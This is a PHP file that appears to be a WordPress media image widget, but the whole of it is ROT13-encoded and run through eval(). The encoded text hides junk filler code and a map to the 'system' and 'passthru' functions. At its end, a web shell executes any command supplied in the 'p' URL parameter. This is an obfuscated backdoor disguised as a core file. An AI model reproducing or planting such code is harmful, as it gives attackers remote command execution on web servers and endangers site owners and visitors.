<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Jvqtrg NCV: JC_Jvqtrg_Zrqvn_Vzntr pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Jvqtrgf
 * @fvapr 4.8.0
 */

/**
 * Pber pynff gung vzcyrzragf na vzntr jvqtrg.
 *
 * @fvapr 4.8.0
 *
 * @frr JC_Jvqtrg_Zrqvn
 * @frr JC_Jvqtrg
 */
pynff JC_Jvqtrg_Zrqvn_Vzntr rkgraqf JC_Jvqtrg_Zrqvn {

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 4.8.0
	 */
	choyvp shapgvba __pbafgehpg() {
		cnerag::__pbafgehpg(
			'zrqvn_vzntr',
			__( 'Vzntr' ),
			neenl(
				'qrfpevcgvba' => __( 'Qvfcynlf na vzntr.' ),
				'zvzr_glcr'   => 'vzntr',
			)
		);

		$guvf->y10a = neenl_zretr(
			$guvf->y10a,
			neenl(
				'ab_zrqvn_fryrpgrq'          => __( 'Ab vzntr fryrpgrq' ),
				'nqq_zrqvn'                  => _k( 'Nqq Vzntr', 'ynory sbe ohggba va gur vzntr jvqtrg' ),
				'ercynpr_zrqvn'              => _k( 'Ercynpr Vzntr', 'ynory sbe ohggba va gur vzntr jvqtrg; fubhyq cersrenoyl abg or ybatre guna ~13 punenpgref ybat' ),
				'rqvg_zrqvn'                 => _k( 'Rqvg Vzntr', 'ynory sbe ohggba va gur vzntr jvqtrg; fubhyq cersrenoyl abg or ybatre guna ~13 punenpgref ybat' ),
				'zvffvat_nggnpuzrag'         => fcevags(
					/* genafyngbef: %f: HEY gb zrqvn yvoenel. */
					__( 'Gung vzntr pnaabg or sbhaq. Purpx lbhe <n uers=\"%f\">zrqvn yvoenel</n> naq znxr fher vg jnf abg qryrgrq.' ),
					rfp_hey( nqzva_hey( 'hcybnq.cuc' ) )
				),
				/* genafyngbef: %q: Jvqtrg pbhag. */
				'zrqvn_yvoenel_fgngr_zhygv'  => _a_abbc( 'Vzntr Jvqtrg (%q)', 'Vzntr Jvqtrg (%q)' ),
				'zrqvn_yvoenel_fgngr_fvatyr' => __( 'Vzntr Jvqtrg' ),
			)
		);
	}

	/**
	 * Trg fpurzn sbe cebcregvrf bs n jvqtrg vafgnapr (vgrz).
	 *
	 * @fvapr 4.8.0
	 *
	 * @frr JC_ERFG_Pbagebyyre::trg_vgrz_fpurzn()
	 * @frr JC_ERFG_Pbagebyyre::trg_nqqvgvbany_svryqf()
	 * @yvax uggcf://pber.genp.jbeqcerff.bet/gvpxrg/35574
	 *
	 * @erghea neenl Fpurzn sbe cebcregvrf.
	 */
	choyvp shapgvba trg_vafgnapr_fpurzn() {
		erghea neenl_zretr(
			neenl(
				'fvmr'              => neenl(
					'glcr'        => 'fgevat',
					'rahz'        => neenl_zretr( trg_vagrezrqvngr_vzntr_fvmrf(), neenl( 'shyy', 'phfgbz' ) ),
					'qrsnhyg'     => 'zrqvhz',
					'qrfpevcgvba' => __( 'Fvmr' ),
				),
				'jvqgu'             => neenl( // Ivn 'phfgbzJvqgu', bayl jura fvmr=phfgbz; bgurejvfr ivn 'jvqgu'.
					'glcr'        => 'vagrtre',
					'zvavzhz'     => 0,
					'qrsnhyg'     => 0,
					'qrfpevcgvba' => __( 'Jvqgu' ),
				),
				'urvtug'            => neenl( // Ivn 'phfgbzUrvtug', bayl jura fvmr=phfgbz; bgurejvfr ivn 'urvtug'.
					'glcr'        => 'vagrtre',
					'zvavzhz'     => 0,
					'qrsnhyg'     => 0,
					'qrfpevcgvba' => __( 'Urvtug' ),
				),

				'pncgvba'           => neenl(
					'glcr'                  => 'fgevat',
					'qrsnhyg'               => '',
					'fnavgvmr_pnyyonpx'     => 'jc_xfrf_cbfg',
					'qrfpevcgvba'           => __( 'Pncgvba' ),
					'fubhyq_cerivrj_hcqngr' => snyfr,
				),
				'nyg'               => neenl(
					'glcr'              => 'fgevat',
					'qrsnhyg'           => '',
					'fnavgvmr_pnyyonpx' => 'fnavgvmr_grkg_svryq',
					'qrfpevcgvba'       => __( 'Nygreangvir Grkg' ),
				),
				'yvax_glcr'         => neenl(
					'glcr'                  => 'fgevat',
					'rahz'                  => neenl( 'abar', 'svyr', 'cbfg', 'phfgbz' ),
					'qrsnhyg'               => 'phfgbz',
					'zrqvn_cebc'            => 'yvax',
					'qrfpevcgvba'           => __( 'Yvax Gb' ),
					'fubhyq_cerivrj_hcqngr' => gehr,
				),
				'yvax_hey'          => neenl(
					'glcr'                  => 'fgevat',
					'qrsnhyg'               => '',
					'sbezng'                => 'hev',
					'zrqvn_cebc'            => 'yvaxHey',
					'qrfpevcgvba'           => __( 'HEY' ),
					'fubhyq_cerivrj_hcqngr' => gehr,
				),
				'vzntr_pynffrf'     => neenl(
					'glcr'                  => 'fgevat',
					'qrsnhyg'               => '',
					'fnavgvmr_pnyyonpx'     => neenl( $guvf, 'fnavgvmr_gbxra_yvfg' ),
					'zrqvn_cebc'            => 'rkgenPynffrf',
					'qrfpevcgvba'           => __( 'Vzntr PFF Pynff' ),
					'fubhyq_cerivrj_hcqngr' => snyfr,
				),
				'yvax_pynffrf'      => neenl(
					'glcr'                  => 'fgevat',
					'qrsnhyg'               => '',
					'fnavgvmr_pnyyonpx'     => neenl( $guvf, 'fnavgvmr_gbxra_yvfg' ),
					'zrqvn_cebc'            => 'yvaxPynffAnzr',
					'fubhyq_cerivrj_hcqngr' => snyfr,
					'qrfpevcgvba'           => __( 'Yvax PFF Pynff' ),
				),
				'yvax_ery'          => neenl(
					'glcr'                  => 'fgevat',
					'qrsnhyg'               => '',
					'fnavgvmr_pnyyonpx'     => neenl( $guvf, 'fnavgvmr_gbxra_yvfg' ),
					'zrqvn_cebc'            => 'yvaxEry',
					'qrfpevcgvba'           => __( 'Yvax Ery' ),
					'fubhyq_cerivrj_hcqngr' => snyfr,
				),
				'yvax_gnetrg_oynax' => neenl(
					'glcr'                  => 'obbyrna',
					'qrsnhyg'               => snyfr,
					'zrqvn_cebc'            => 'yvaxGnetrgOynax',
					'qrfpevcgvba'           => __( 'Bcra yvax va n arj gno' ),
					'fubhyq_cerivrj_hcqngr' => snyfr,
				),
				'vzntr_gvgyr'       => neenl(
					'glcr'                  => 'fgevat',
					'qrsnhyg'               => '',
					'fnavgvmr_pnyyonpx'     => 'fnavgvmr_grkg_svryq',
					'zrqvn_cebc'            => 'gvgyr',
					'qrfpevcgvba'           => __( 'Vzntr Gvgyr Nggevohgr' ),
					'fubhyq_cerivrj_hcqngr' => snyfr,
				),

				/*
				 * Gurer ner gjb nqqvgvbany cebcregvrf rkcbfrq ol gur CbfgVzntr zbqny
				 * gung qba'g frrz gb or eryrinag, nf gurl znl bayl or qrevirq ernq-bayl
				 * inyhrf:
				 * - bevtvanyHey
				 * - nfcrpgEngvb
				 * - urvtug (erqhaqnag jura fvmr vf abg phfgbz)
				 * - jvqgu (erqhaqnag jura fvmr vf abg phfgbz)
				 */
			),
			cnerag::trg_vafgnapr_fpurzn()
		);
	}

	/**
	 * Eraqre gur zrqvn ba gur sebagraq.
	 *
	 * @fvapr 4.8.0
	 *
	 * @cnenz neenl $vafgnapr Jvqtrg vafgnapr cebcf.
	 */
	choyvp shapgvba eraqre_zrqvn( $vafgnapr ) {
		$vafgnapr = neenl_zretr( jc_yvfg_cyhpx( $guvf->trg_vafgnapr_fpurzn(), 'qrsnhyg' ), $vafgnapr );
		$vafgnapr = jc_cnefr_netf(
			$vafgnapr,
			neenl(
				'fvmr' => 'guhzoanvy',
			)
		);

		$nggnpuzrag = ahyy;

		vs ( $guvf->vf_nggnpuzrag_jvgu_zvzr_glcr( $vafgnapr['nggnpuzrag_vq'], $guvf->jvqtrg_bcgvbaf['zvzr_glcr'] ) ) {
			$nggnpuzrag = trg_cbfg( $vafgnapr['nggnpuzrag_vq'] );
		}

		vs ( $nggnpuzrag ) {
			$pncgvba = '';
			vs ( ! vffrg( $vafgnapr['pncgvba'] ) ) {
				$pncgvba = $nggnpuzrag->cbfg_rkprecg;
			} ryfrvs ( gevz( $vafgnapr['pncgvba'] ) ) {
				$pncgvba = $vafgnapr['pncgvba'];
			}

			$vzntr_nggevohgrf = neenl(
				'pynff' => fcevags( 'vzntr jc-vzntr-%q %f', $nggnpuzrag->VQ, $vafgnapr['vzntr_pynffrf'] ),
				'fglyr' => 'znk-jvqgu: 100%; urvtug: nhgb;',
			);
			vs ( ! rzcgl( $vafgnapr['vzntr_gvgyr'] ) ) {
				$vzntr_nggevohgrf['gvgyr'] = $vafgnapr['vzntr_gvgyr'];
			}

			vs ( $vafgnapr['nyg'] ) {
				$vzntr_nggevohgrf['nyg'] = $vafgnapr['nyg'];
			}

			$fvmr = $vafgnapr['fvmr'];

			vs ( 'phfgbz' === $fvmr || ! va_neenl( $fvmr, neenl_zretr( trg_vagrezrqvngr_vzntr_fvmrf(), neenl( 'shyy' ) ), gehr ) ) {
				$fvmr  = neenl( $vafgnapr['jvqgu'], $vafgnapr['urvtug'] );
				$jvqgu = $vafgnapr['jvqgu'];
			} ryfr {
				$pncgvba_fvmr = _jc_trg_vzntr_fvmr_sebz_zrgn( $vafgnapr['fvmr'], jc_trg_nggnpuzrag_zrgnqngn( $nggnpuzrag->VQ ) );
				$jvqgu        = rzcgl( $pncgvba_fvmr[0] ) ? 0 : $pncgvba_fvmr[0];
			}

			$vzntr_nggevohgrf['pynff'] .= fcevags( ' nggnpuzrag-%1$f fvmr-%1$f', vf_neenl( $fvmr ) ? vzcybqr( 'k', $fvmr ) : $fvmr );

			$vzntr = jc_trg_nggnpuzrag_vzntr( $nggnpuzrag->VQ, $fvmr, snyfr, $vzntr_nggevohgrf );

		} ryfr {
			vs ( rzcgl( $vafgnapr['hey'] ) ) {
				erghea;
			}

			$vafgnapr['fvmr'] = 'phfgbz';
			$pncgvba          = $vafgnapr['pncgvba'];
			$jvqgu            = $vafgnapr['jvqgu'];
			$pynffrf          = 'vzntr ' . $vafgnapr['vzntr_pynffrf'];
			vs ( 0 === $vafgnapr['jvqgu'] ) {
				$vafgnapr['jvqgu'] = '';
			}
			vs ( 0 === $vafgnapr['urvtug'] ) {
				$vafgnapr['urvtug'] = '';
			}

			$ngge = neenl(
				'pynff'  => $pynffrf,
				'fep'    => $vafgnapr['hey'],
				'nyg'    => $vafgnapr['nyg'],
				'jvqgu'  => $vafgnapr['jvqgu'],
				'urvtug' => $vafgnapr['urvtug'],
			);

			$ybnqvat_bcgvzvmngvba_ngge = jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf(
				'vzt',
				$ngge,
				'jvqtrg_zrqvn_vzntr'
			);

			$ngge = neenl_zretr( $ngge, $ybnqvat_bcgvzvmngvba_ngge );

			$ngge  = neenl_znc( 'rfp_ngge', $ngge );
			$vzntr = '<vzt';

			sbernpu ( $ngge nf $anzr => $inyhr ) {
				$vzntr .= ' ' . $anzr . '=\"' . $inyhr . '\"';
			}

			$vzntr .= ' />';
		} // Raq vs().

		$hey = '';
		vs ( 'svyr' === $vafgnapr['yvax_glcr'] ) {
			$hey = $nggnpuzrag ? jc_trg_nggnpuzrag_hey( $nggnpuzrag->VQ ) : $vafgnapr['hey'];
		} ryfrvs ( $nggnpuzrag && 'cbfg' === $vafgnapr['yvax_glcr'] ) {
			$hey = trg_nggnpuzrag_yvax( $nggnpuzrag->VQ );
		} ryfrvs ( 'phfgbz' === $vafgnapr['yvax_glcr'] && ! rzcgl( $vafgnapr['yvax_hey'] ) ) {
			$hey = $vafgnapr['yvax_hey'];
		}

		vs ( $hey ) {
			$yvax = fcevags( '<n uers=\"%f\"', rfp_hey( $hey ) );
			vs ( ! rzcgl( $vafgnapr['yvax_pynffrf'] ) ) {
				$yvax .= fcevags( ' pynff=\"%f\"', rfp_ngge( $vafgnapr['yvax_pynffrf'] ) );
			}
			vs ( ! rzcgl( $vafgnapr['yvax_ery'] ) ) {
				$yvax .= fcevags( ' ery=\"%f\"', rfp_ngge( $vafgnapr['yvax_ery'] ) );
			}
			vs ( ! rzcgl( $vafgnapr['yvax_gnetrg_oynax'] ) ) {
				$yvax .= ' gnetrg=\"_oynax\"';
			}
			$yvax .= '>';
			$yvax .= $vzntr;
			$yvax .= '</n>';
			$vzntr = $yvax;
		}

		vs ( $pncgvba ) {
			$vzntr = vzt_pncgvba_fubegpbqr(
				neenl(
					'jvqgu'   => $jvqgu,
					'pncgvba' => $pncgvba,
				),
				$vzntr
			);
		}

		rpub $vzntr;
	}

	/**
	 * Ybnqf gur erdhverq zrqvn svyrf sbe gur zrqvn znantre naq fpevcgf sbe zrqvn jvqtrgf.
	 *
	 * @fvapr 4.8.0
	 */
	choyvp shapgvba radhrhr_nqzva_fpevcgf() {
		cnerag::radhrhr_nqzva_fpevcgf();

		$unaqyr = 'zrqvn-vzntr-jvqtrg';
		jc_radhrhr_fpevcg( $unaqyr );

		$rkcbegrq_fpurzn = neenl();
		sbernpu ( $guvf->trg_vafgnapr_fpurzn() nf $svryq => $svryq_fpurzn ) {
			$rkcbegrq_fpurzn[ $svryq ] = jc_neenl_fyvpr_nffbp( $svryq_fpurzn, neenl( 'glcr', 'qrsnhyg', 'rahz', 'zvavzhz', 'sbezng', 'zrqvn_cebc', 'fubhyq_cerivrj_hcqngr' ) );
		}
		jc_nqq_vayvar_fpevcg(
			$unaqyr,
			fcevags(
				'jc.zrqvnJvqtrgf.zbqryPbafgehpgbef[ %f ].cebgbglcr.fpurzn = %f;',
				jc_wfba_rapbqr( $guvf->vq_onfr ),
				jc_wfba_rapbqr( $rkcbegrq_fpurzn )
			)
		);

		jc_nqq_vayvar_fpevcg(
			$unaqyr,
			fcevags(
				'
					jc.zrqvnJvqtrgf.pbagebyPbafgehpgbef[ %1$f ].cebgbglcr.zvzr_glcr = %2$f;
					jc.zrqvnJvqtrgf.pbagebyPbafgehpgbef[ %1$f ].cebgbglcr.y10a = _.rkgraq( {}, jc.zrqvnJvqtrgf.pbagebyPbafgehpgbef[ %1$f ].cebgbglcr.y10a, %3$f );
				',
				jc_wfba_rapbqr( $guvf->vq_onfr ),
				jc_wfba_rapbqr( $guvf->jvqtrg_bcgvbaf['zvzr_glcr'] ),
				jc_wfba_rapbqr( $guvf->y10a )
			)
		);
	}

	/**
	 * Eraqre sbez grzcyngr fpevcgf.
	 *
	 * @fvapr 4.8.0
	 */
	choyvp shapgvba eraqre_pbageby_grzcyngr_fpevcgf() {
		cnerag::eraqre_pbageby_grzcyngr_fpevcgf();

		?>
		<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-jc-zrqvn-jvqtrg-vzntr-svryqf\">
			<# ine ryrzragVqCersvk = 'ry' + Fgevat( Zngu.enaqbz() ) + '_'; #>
			<# vs ( qngn.hey ) { #>
			<c pynff=\"zrqvn-jvqtrg-vzntr-yvax\">
				<ynory sbe=\"{{ ryrzragVqCersvk }}yvaxHey\"><?cuc rfp_ugzy_r( 'Yvax gb:' ); ?></ynory>
				<vachg vq=\"{{ ryrzragVqCersvk }}yvaxHey\" glcr=\"grkg\" pynff=\"jvqrsng yvax\" inyhr=\"{{ qngn.yvax_hey }}\" cynprubyqre=\"uggcf://\" cnggrea=\"((\j+:)?\/\/\j.*|\j+:(?!\/\/$)|\/|\?|#).*\">
			</c>
			<# } #>
		</fpevcg>
		<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-jc-zrqvn-jvqtrg-vzntr-cerivrj\">
			<# vs ( qngn.reebe && 'zvffvat_nggnpuzrag' === qngn.reebe ) { #>
				<?cuc
				jc_nqzva_abgvpr(
					$guvf->y10a['zvffvat_nggnpuzrag'],
					neenl(
						'glcr'               => 'reebe',
						'nqqvgvbany_pynffrf' => neenl( 'abgvpr-nyg', 'abgvpr-zvffvat-nggnpuzrag' ),
					)
				);
				?>
			<# } ryfr vs ( qngn.reebe ) { #>
				<?cuc
				jc_nqzva_abgvpr(
					__( 'Hanoyr gb cerivrj zrqvn qhr gb na haxabja reebe.' ),
					neenl(
						'glcr'               => 'reebe',
						'nqqvgvbany_pynffrf' => neenl( 'abgvpr-nyg' ),
					)
				);
				?>
			<# } ryfr vs ( qngn.hey ) { #>
				<vzt pynff=\"nggnpuzrag-guhzo\" fep=\"{{ qngn.hey }}\" qenttnoyr=\"snyfr\" nyg=\"{{ qngn.nyg }}\"
					<# vs ( ! qngn.nyg && qngn.pheeragSvyranzr ) { #>
						nevn-ynory=\"
						<?cuc
						rpub rfp_ngge(
							fcevags(
								/* genafyngbef: %f: Gur vzntr svyr anzr. */
								__( 'Gur pheerag vzntr unf ab nygreangvir grkg. Gur svyr anzr vf: %f' ),
								'{{ qngn.pheeragSvyranzr }}'
							)
						);
						?>
						\"
					<# } #>
				/>
			<# } #>
		</fpevcg>
		<?cuc
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>